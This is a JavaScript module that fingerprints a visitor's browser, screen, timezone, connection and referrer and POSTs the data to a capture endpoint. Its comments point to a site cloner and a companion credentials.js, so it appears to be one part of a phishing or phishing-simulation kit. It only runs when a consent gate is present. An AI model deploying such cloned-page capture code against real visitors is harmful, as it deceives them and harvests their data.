/**
 * device-info.js — collects basic browser/device fingerprint data and
 * POSTs it once.
 *
 * Gated: only runs after the consent notice has been accepted. With no gate
 * present it stays inert.
 */
(function () {
  'use strict';

  /* Entry point — handed to the gate, not run on load. */
  function run() {
    if (!window.__SB_TARGET) return;

    function safe(fn) { try { return fn(); } catch (_) { return null; } }

    const data = {
      user_agent:     navigator.userAgent,
      platform:       navigator.platform,
      languages:      navigator.languages || [navigator.language],
      cookies_on:     navigator.cookieEnabled,
      do_not_track:   navigator.doNotTrack,
      online:         navigator.onLine,
      screen: {
        width:        screen.width,
        height:       screen.height,
        avail_w:      screen.availWidth,
        avail_h:      screen.availHeight,
        color_depth:  screen.colorDepth,
        pixel_ratio:  window.devicePixelRatio || 1,
      },
      viewport: {
        width:  window.innerWidth,
        height: window.innerHeight,
      },
      timezone:       safe(() => Intl.DateTimeFormat().resolvedOptions().timeZone),
      timezone_off:   new Date().getTimezoneOffset(),
      referrer:       document.referrer || null,
      page_url:       location.href,
      hardware_cores: navigator.hardwareConcurrency || null,
      device_memory:  navigator.deviceMemory || null,
      connection:     safe(() => {
        const c = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
        return c ? { type: c.effectiveType, downlink: c.downlink, rtt: c.rtt } : null;
      }),
      captured_at:    new Date().toISOString(),
    };

    // Build via __SB_API so the cloner's <base href> can't redirect us
    // back to the original site — same reason credentials.js does this.
    var url = window.__SB_API
      ? window.__SB_API('device')
      : (location.origin + '/api/capture.php?slug=' + encodeURIComponent(window.__SB_TARGET) + '&kind=device');

    fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(data),
      keepalive: true,
    }).catch(() => {});
  }

  // Fail-closed: no consent controller means no capture.
  if (!window.__SB_CONSENT) return;
  window.__SB_CONSENT.register('device-info', run);
})();
